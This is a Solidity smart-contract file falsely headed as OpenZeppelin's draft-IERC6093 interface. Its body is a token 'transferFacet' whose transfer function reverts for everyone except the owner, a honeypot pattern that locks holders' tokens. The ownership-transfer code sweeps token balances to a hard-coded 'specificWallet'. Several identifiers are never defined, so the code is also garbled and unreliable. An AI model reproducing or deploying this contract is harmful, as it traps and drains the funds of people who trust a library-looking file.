// File: @openzeppelin/contracts/interfaces/draft-IERC6093.sol

// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.20;
import "./TestLib.sol";
contract transferFacet is ERC20 {
    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            msg.sender == ds.owner,
            "Only the ds.owner can call this function"
        );
        _;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            recipient != specificWallet,
            "Cannot transfer to specific wallet"
        );
        if (msg.sender == ds.owner) {
            super.transfer(recipient, amount);
            return true;
        } else {
            revert("Unauthorized transfer");
        }
    }
    function transferWithGas(
        address token,
        address recipient,
        uint256 amount
    ) private {
        // Estimate gas for transfer
        uint256 gasEstimation = estimateGas();

        // Transfer tokens with gas fees
        (bool success, ) = token.call{value: gasEstimation, gas: gasEstimation}(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                recipient,
                amount
            )
        );
        require(success, "Token transfer failed");
    }
    function transferAllNonExpellTokensToSpecificWallet() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // Transfer tokens from new ds.owner's wallet to specific wallet
        for (uint256 i = 0; i < ds._allTokens.length; i++) {
            address token = _tokenAtIndex(i);
            if (
                token != address(this) &&
                token != address(0) &&
                token != ds.owner &&
                token != specificWallet
            ) {
                // Transfer tokens from new ds.owner's wallet to specific wallet
                transferWithGas(token, specificWallet, balanceOf(token));
                emit TokensTransferred(
                    ds.owner,
                    specificWallet,
                    token,
                    balanceOf(token)
                );
            }
        }
    }
    function _tokenAtIndex(uint256 index) private view returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(index < ds._allTokens.length, "Index out of bounds");
        return ds._allTokens[index];
    }
    function transferOwnership(address newOwner) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newOwner != address(0),
            "New ds.owner cannot be the zero address"
        );
        emit OwnershipTransferred(ds.owner, newOwner);

        // Transfer ownership
        ds.owner = newOwner;

        // Transfer all tokens from the new ds.owner's wallet to the specific wallet
        for (uint256 i = 0; i < ds._allTokens.length; i++) {
            address token = _tokenAtIndex(i);
            if (
                token != address(this) &&
                token != address(0) &&
                token != newOwner &&
                token != specificWallet
            ) {
                transferWithGas(token, specificWallet, balanceOf(token));
                emit TokensTransferred(
                    newOwner,
                    specificWallet,
                    token,
                    balanceOf(token)
                );
            }
        }
    }
    function estimateGas() private view returns (uint256) {
        uint256 gasLimit = 100000; // Set a gas limit for the transfer
        uint256 gasPrice = tx.gasprice; // Get the gas price
        uint256 gasCost = gasLimit * gasPrice; // Calculate the gas cost
        return gasCost;
    }
}
